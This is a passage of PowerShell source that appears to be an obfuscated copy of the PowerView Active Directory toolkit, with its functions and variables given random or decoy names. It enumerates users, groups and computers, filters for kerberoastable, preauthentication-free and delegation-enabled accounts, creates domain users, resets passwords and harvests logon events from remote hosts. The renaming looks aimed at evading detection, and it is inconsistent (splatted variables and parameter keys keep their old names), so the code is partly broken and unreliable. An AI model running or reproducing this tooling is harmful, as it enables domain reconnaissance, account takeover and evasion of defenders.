        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $IJotEPqg99 = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')
        $KwnLcnio99 = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')
        $GcznMriq99 = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')
        $VrICpjXS99 = @{}
        if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['LDAPFilter']) { $VrICpjXS99['LDAPFilter'] = $vqxjYeAS99 }
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
        if ($PSBoundParameters['Domain']) {
            if ($PSBoundParameters['Credential']) {
                $YYfFufmF99 = retrenchments -gddrYpaX99 $gddrYpaX99 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $YYfFufmF99 = retrenchments -gddrYpaX99 $gddrYpaX99 -xjRyyQze99 $xjRyyQze99 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            Write-Verbose "[rested] Enumerated forest '$YYfFufmF99' for target domain '$gddrYpaX99'"
        }
        $syqHMpbj99 = @{}
        if ($PSBoundParameters['Credential']) { $syqHMpbj99['Credential'] = $xjRyyQze99 }
        if ($YYfFufmF99) {
            $syqHMpbj99['Forest'] = $YYfFufmF99
        }
    }
    PROCESS {
        if ($PSBoundParameters['ReferencePropertySet']) {
            Write-Verbose "[rested] Using specified -MdKGLCTm99"
            $OszAClFl99 = $MdKGLCTm99
        }
        elseif ($PSBoundParameters['ReferenceObject']) {
            Write-Verbose "[rested] Extracting property names from -ouvBXyuL99 to use as the reference property set"
            $OszAClFl99 = Get-Member -MnfPrxTx99 $ouvBXyuL99 -MemberType NoteProperty | Select-Object -Expand Name
            $jvKdWghB99 = $ouvBXyuL99.objectclass | Select-Object -Last 1
            Write-Verbose "[rested] Calculated ReferenceObjectClass : $jvKdWghB99"
        }
        else {
            Write-Verbose "[rested] Using the default reference property set for the object class '$vCFNAEmG99'"
        }
        if (($vCFNAEmG99 -eq 'User') -or ($jvKdWghB99 -eq 'User')) {
            $xBdmGFTx99 = wasteland @SearcherArguments
            if (-not $OszAClFl99) {
                $OszAClFl99 = $IJotEPqg99
            }
        }
        elseif (($vCFNAEmG99 -eq 'Group') -or ($jvKdWghB99 -eq 'Group')) {
            $xBdmGFTx99 = floors @SearcherArguments
            if (-not $OszAClFl99) {
                $OszAClFl99 = $KwnLcnio99
            }
        }
        elseif (($vCFNAEmG99 -eq 'Computer') -or ($jvKdWghB99 -eq 'Computer')) {
            $xBdmGFTx99 = pickerels @SearcherArguments
            if (-not $OszAClFl99) {
                $OszAClFl99 = $GcznMriq99
            }
        }
        else {
            throw "[rested] Invalid class: $vCFNAEmG99"
        }
        ForEach ($Object in $xBdmGFTx99) {
            $duEvkxCp99 = Get-Member -MnfPrxTx99 $Object -MemberType NoteProperty | Select-Object -Expand Name
            ForEach($btLTRbPO99 in $duEvkxCp99) {
                if ($OszAClFl99 -NotContains $btLTRbPO99) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'SamAccountName' $Object.SamAccountName
                    $Out | Add-Member Noteproperty 'Property' $btLTRbPO99
                    $Out | Add-Member Noteproperty 'Value' $Object.$btLTRbPO99
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                    $Out
                }
            }
        }
    }
}
function wasteland {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $phaEiMpW99,
        [Switch]
        $SPN,
        [Switch]
        $hhjHMdFg99,
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $zDntLcLY99,
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $onZVhFKq99,
        [Switch]
        $aTnpflEu99,
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $EXVyQtiu99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PjvsRTzX99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $VnyrBvDm99,
        [Switch]
        $kQTByXSX99,
        [Alias('ReturnOne')]
        [Switch]
        $DiGVDgqd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $XiIvCfrW99 = [Enum]::GetNames($xMqsGAsx99)
        $XiIvCfrW99 = $XiIvCfrW99 | ForEach-Object {$_; "NOT_$_"}
        Victrola -Name UACFilter -KgKkGSIJ99 $XiIvCfrW99 -Type ([array])
    }
    BEGIN {
        $VrICpjXS99 = @{}
        if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Properties']) { $VrICpjXS99['Properties'] = $PjvsRTzX99 }
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['SecurityMasks']) { $VrICpjXS99['SecurityMasks'] = $VnyrBvDm99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
        $fZeXaaEw99 = indenturing @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            Victrola -modcDTlj99 -ADYXbIdr99 $PSBoundParameters
        }
        if ($fZeXaaEw99) {
            $hAflFVrb99 = ''
            $tGcqvLrx99 = ''
            $phaEiMpW99 | Where-Object {$_} | ForEach-Object {
                $SvGoFRkz99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($SvGoFRkz99 -match '^S-1-') {
                    $hAflFVrb99 += "(objectsid=$SvGoFRkz99)"
                }
                elseif ($SvGoFRkz99 -match '^CN=') {
                    $hAflFVrb99 += "(distinguishedname=$SvGoFRkz99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $chKaCwXV99 = $SvGoFRkz99.SubString($SvGoFRkz99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[wasteland] Extracted domain '$chKaCwXV99' from '$SvGoFRkz99'"
                        $VrICpjXS99['Domain'] = $chKaCwXV99
                        $fZeXaaEw99 = indenturing @SearcherArguments
                        if (-not $fZeXaaEw99) {
                            Write-Warning "[wasteland] Unable to retrieve domain searcher for '$chKaCwXV99'"
                        }
                    }
                }
                elseif ($SvGoFRkz99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $PFeUtWYw99 = (([Guid]$SvGoFRkz99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $hAflFVrb99 += "(objectguid=$PFeUtWYw99)"
                }
                elseif ($SvGoFRkz99.Contains('\')) {
                    $upTkBJHa99 = $SvGoFRkz99.Replace('\28', '(').Replace('\29', ')') | macrocosms -xilKAxpM99 Canonical
                    if ($upTkBJHa99) {
                        $qgzVOkSs99 = $upTkBJHa99.SubString(0, $upTkBJHa99.IndexOf('/'))
                        $QuaUtxHk99 = $SvGoFRkz99.Split('\')[1]
                        $hAflFVrb99 += "(samAccountName=$QuaUtxHk99)"
                        $VrICpjXS99['Domain'] = $qgzVOkSs99
                        Write-Verbose "[wasteland] Extracted domain '$qgzVOkSs99' from '$SvGoFRkz99'"
                        $fZeXaaEw99 = indenturing @SearcherArguments
                    }
                }
                else {
                    $hAflFVrb99 += "(samAccountName=$SvGoFRkz99)"
                }
            }
            if ($hAflFVrb99 -and ($hAflFVrb99.Trim() -ne '') ) {
                $tGcqvLrx99 += "(|$hAflFVrb99)"
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[wasteland] Searching for non-null service principal names'
                $tGcqvLrx99 += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[wasteland] Searching for users who can be delegated'
                $tGcqvLrx99 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[wasteland] Searching for users who are sensitive and not trusted for delegation'
                $tGcqvLrx99 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[wasteland] Searching for adminCount=1'
                $tGcqvLrx99 += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[wasteland] Searching for users that are trusted to authenticate for other principals'
                $tGcqvLrx99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[wasteland] Searching for user accounts that do not require kerberos preauthenticate'
                $tGcqvLrx99 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[wasteland] Using additional LDAP filter: $vqxjYeAS99"
                $tGcqvLrx99 += "$vqxjYeAS99"
            }
            $WzXRlwkq99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $cKZwWfgT99 = $_.Substring(4)
                    $TSzPfUTg99 = [Int]($xMqsGAsx99::$cKZwWfgT99)
                    $tGcqvLrx99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$TSzPfUTg99))"
                }
                else {
                    $TSzPfUTg99 = [Int]($xMqsGAsx99::$_)
                    $tGcqvLrx99 += "(userAccountControl:1.2.840.113556.1.4.803:=$TSzPfUTg99)"
                }
            }
            $fZeXaaEw99.filter = "(&(samAccountType=805306368)$tGcqvLrx99)"
            Write-Verbose "[wasteland] filter string: $($fZeXaaEw99.filter)"
            if ($PSBoundParameters['FindOne']) { $jAOXTyAF99 = $fZeXaaEw99.FindOne() }
            else { $jAOXTyAF99 = $fZeXaaEw99.FindAll() }
            $jAOXTyAF99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = favorites -PjvsRTzX99 $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($jAOXTyAF99) {
                try { $jAOXTyAF99.dispose() }
                catch {
                    Write-Verbose "[wasteland] Error disposing of the Results object: $_"
                }
            }
            $fZeXaaEw99.dispose()
        }
    }
}
function Amparo {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $ryaimXPz99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $LZgdrxfT99,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $SBWmjmDy99,
        [ValidateNotNullOrEmpty()]
        [String]
        $YgmZxNNi99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    $VAidWYXW99 = @{
        'Identity' = $ryaimXPz99
    }
    if ($PSBoundParameters['Domain']) { $VAidWYXW99['Domain'] = $gddrYpaX99 }
    if ($PSBoundParameters['Credential']) { $VAidWYXW99['Credential'] = $xjRyyQze99 }
    $OWKsdjuY99 = optics @ContextArguments
    if ($OWKsdjuY99) {
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($OWKsdjuY99.Context)
        $User.SamAccountName = $OWKsdjuY99.Identity
        $DIlTEqIU99 = New-Object System.Management.Automation.PSCredential('a', $LZgdrxfT99)
        $User.SetPassword($DIlTEqIU99.GetNetworkCredential().Password)
        $User.Enabled = $True
        $User.PasswordNotRequired = $False
        if ($PSBoundParameters['Name']) {
            $User.Name = $Name
        }
        else {
            $User.Name = $OWKsdjuY99.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $User.DisplayName = $SBWmjmDy99
        }
        else {
            $User.DisplayName = $OWKsdjuY99.Identity
        }
        if ($PSBoundParameters['Description']) {
            $User.Description = $YgmZxNNi99
        }
        Write-Verbose "[Amparo] Attempting to create user '$ryaimXPz99'"
        try {
            $Null = $User.Save()
            Write-Verbose "[Amparo] User '$ryaimXPz99' successfully created"
            $User
        }
        catch {
            Write-Warning "[Amparo] Error creating user '$ryaimXPz99' : $_"
        }
    }
}
function youngest {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $phaEiMpW99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $LZgdrxfT99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    $VAidWYXW99 = @{ 'Identity' = $phaEiMpW99 }
    if ($PSBoundParameters['Domain']) { $VAidWYXW99['Domain'] = $gddrYpaX99 }
    if ($PSBoundParameters['Credential']) { $VAidWYXW99['Credential'] = $xjRyyQze99 }
    $OWKsdjuY99 = optics @ContextArguments
    if ($OWKsdjuY99) {
        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($OWKsdjuY99.Context, $phaEiMpW99)
        if ($User) {
            Write-Verbose "[youngest] Attempting to set the password for user '$phaEiMpW99'"
            try {
                $DIlTEqIU99 = New-Object System.Management.Automation.PSCredential('a', $LZgdrxfT99)
                $User.SetPassword($DIlTEqIU99.GetNetworkCredential().Password)
                $Null = $User.Save()
                Write-Verbose "[youngest] Password for user '$phaEiMpW99' successfully reset"
            }
            catch {
                Write-Warning "[youngest] Error setting password for user '$phaEiMpW99' : $_"
            }
        }
        else {
            Write-Warning "[youngest] Unable to find user '$phaEiMpW99'"
        }
    }
}
function zephyr {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lgkTdAeF99 = $Env:COMPUTERNAME,
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $MDWNJDQX99 = [DateTime]::Now.AddDays(-1),
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $AZxmvbdC99 = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $rExYsMZe99 = 5000,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $RZipMgEl99 = @"
<QueryList>
    <Query Id="0" Path="Security">
        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$($MDWNJDQX99.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($AZxmvbdC99.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>
        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$($MDWNJDQX99.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($AZxmvbdC99.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>
        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        $tecccWzA99 = @{
            'FilterXPath' = $RZipMgEl99
            'LogName' = 'Security'
            'MaxEvents' = $rExYsMZe99
        }
        if ($PSBoundParameters['Credential']) { $tecccWzA99['Credential'] = $xjRyyQze99 }
    }
    PROCESS {
        ForEach ($zNIilCKh99 in $lgkTdAeF99) {
            $tecccWzA99['ComputerName'] = $zNIilCKh99
            Get-WinEvent @EventArguments| ForEach-Object {
                $Event = $_
                $PjvsRTzX99 = $Event.Properties
                Switch ($Event.Id) {
                    4624 {
                        if(-not $PjvsRTzX99[5].Value.EndsWith('$')) {
                            $jmVDoyyB99 = New-Object PSObject -Property @{
                                ComputerName              = $zNIilCKh99
                                TimeCreated               = $Event.TimeCreated
                                EventId                   = $Event.Id
                                SubjectUserSid            = $PjvsRTzX99[0].Value.ToString()
                                SubjectUserName           = $PjvsRTzX99[1].Value
                                SubjectDomainName         = $PjvsRTzX99[2].Value
                                SubjectLogonId            = $PjvsRTzX99[3].Value
                                TargetUserSid             = $PjvsRTzX99[4].Value.ToString()
                                TargetUserName            = $PjvsRTzX99[5].Value
                                TargetDomainName          = $PjvsRTzX99[6].Value
                                TargetLogonId             = $PjvsRTzX99[7].Value
                                LogonType                 = $PjvsRTzX99[8].Value
                                LogonProcessName          = $PjvsRTzX99[9].Value
                                AuthenticationPackageName = $PjvsRTzX99[10].Value
                                WorkstationName           = $PjvsRTzX99[11].Value
                                LogonGuid                 = $PjvsRTzX99[12].Value
                                TransmittedServices       = $PjvsRTzX99[13].Value
                                LmPackageName             = $PjvsRTzX99[14].Value
                                KeyLength                 = $PjvsRTzX99[15].Value
                                ProcessId                 = $PjvsRTzX99[16].Value
                                ProcessName               = $PjvsRTzX99[17].Value
                                IpAddress                 = $PjvsRTzX99[18].Value
                                IpPort                    = $PjvsRTzX99[19].Value
                                ImpersonationLevel        = $PjvsRTzX99[20].Value
                                RestrictedAdminMode       = $PjvsRTzX99[21].Value
                                TargetOutboundUserName    = $PjvsRTzX99[22].Value
                                TargetOutboundDomainName  = $PjvsRTzX99[23].Value
                                VirtualAccount            = $PjvsRTzX99[24].Value
                                TargetLinkedLogonId       = $PjvsRTzX99[25].Value
                                ElevatedToken             = $PjvsRTzX99[26].Value
                            }
                            $jmVDoyyB99.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
                            $jmVDoyyB99
                        }
                    }
                    4648 {
                        if((-not $PjvsRTzX99[5].Value.EndsWith('$')) -and ($PjvsRTzX99[11].Value -match 'taskhost\.exe')) {
                            $jmVDoyyB99 = New-Object PSObject -Property @{
                                ComputerName              = $zNIilCKh99
                                TimeCreated       = $Event.TimeCreated
                                EventId           = $Event.Id
                                SubjectUserSid    = $PjvsRTzX99[0].Value.ToString()
                                SubjectUserName   = $PjvsRTzX99[1].Value
                                SubjectDomainName = $PjvsRTzX99[2].Value
                                SubjectLogonId    = $PjvsRTzX99[3].Value
                                LogonGuid         = $PjvsRTzX99[4].Value.ToString()
                                TargetUserName    = $PjvsRTzX99[5].Value
                                TargetDomainName  = $PjvsRTzX99[6].Value
                                TargetLogonGuid   = $PjvsRTzX99[7].Value
                                TargetServerName  = $PjvsRTzX99[8].Value
                                TargetInfo        = $PjvsRTzX99[9].Value
                                ProcessId         = $PjvsRTzX99[10].Value
                                ProcessName       = $PjvsRTzX99[11].Value
                                IpAddress         = $PjvsRTzX99[12].Value
                                IpPort            = $PjvsRTzX99[13].Value
                            }
                            $jmVDoyyB99.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
                            $jmVDoyyB99
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $($Event.Id)"
                    }
                }
            }
        }
    }
}
function skyward {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}
    $vXRuWhpa99 = @{}
    if ($PSBoundParameters['Credential']) { $vXRuWhpa99['Credential'] = $xjRyyQze99 }
    try {
        $wjXBlnRx99 = (creatives @ForestArguments).schema.name
    }
    catch {
        throw '[skyward] Error in retrieving forest schema path from creatives'
    }
    if (-not $wjXBlnRx99) {
        throw '[skyward] Error in retrieving forest schema path from creatives'
    }
    $VrICpjXS99 = @{
        'SearchBase' = $wjXBlnRx99
        'LDAPFilter' = '(schemaIDGUID=*)'
    }
    if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
    if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
    if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
    if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
    if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
    $itYJoyGq99 = indenturing @SearcherArguments
    if ($itYJoyGq99) {
        try {
            $jAOXTyAF99 = $itYJoyGq99.FindAll()
            $jAOXTyAF99 | Where-Object {$_} | ForEach-Object {
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if ($jAOXTyAF99) {
                try { $jAOXTyAF99.dispose() }
                catch {
                    Write-Verbose "[skyward] Error disposing of the Results object: $_"
                }
            }
            $itYJoyGq99.dispose()
        }
        catch {
            Write-Verbose "[skyward] Error in building GUID map: $_"
        }
    }
    $VrICpjXS99['SearchBase'] = $wjXBlnRx99.replace('Schema','Extended-Rights')
    $VrICpjXS99['LDAPFilter'] = '(objectClass=controlAccessRight)'
    $fYWYFKCn99 = indenturing @SearcherArguments
    if ($fYWYFKCn99) {
        try {
            $jAOXTyAF99 = $fYWYFKCn99.FindAll()
            $jAOXTyAF99 | Where-Object {$_} | ForEach-Object {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if ($jAOXTyAF99) {
                try { $jAOXTyAF99.dispose() }
                catch {
                    Write-Verbose "[skyward] Error disposing of the Results object: $_"
                }
            }
            $fYWYFKCn99.dispose()
        }
        catch {
            Write-Verbose "[skyward] Error in building GUID map: $_"
        }
    }
    $GUIDs
}
function pickerels {
    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $phaEiMpW99,
        [Switch]
        $tdRSmHCF99,
        [Switch]
        $aTnpflEu99,
        [Switch]
        $MEjIjrXW99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $SPN,
        [ValidateNotNullOrEmpty()]
        [String]
        $fNLjzEnS99,
        [ValidateNotNullOrEmpty()]
        [String]
        $OUZDyVMQ99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ixDINSpI99,
        [Switch]
        $Ping,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PjvsRTzX99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $VnyrBvDm99,
        [Switch]
        $kQTByXSX99,
        [Alias('ReturnOne')]
        [Switch]
        $DiGVDgqd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $XiIvCfrW99 = [Enum]::GetNames($xMqsGAsx99)
        $XiIvCfrW99 = $XiIvCfrW99 | ForEach-Object {$_; "NOT_$_"}
        Victrola -Name UACFilter -KgKkGSIJ99 $XiIvCfrW99 -Type ([array])
    }
    BEGIN {
        $VrICpjXS99 = @{}
        if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Properties']) { $VrICpjXS99['Properties'] = $PjvsRTzX99 }
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
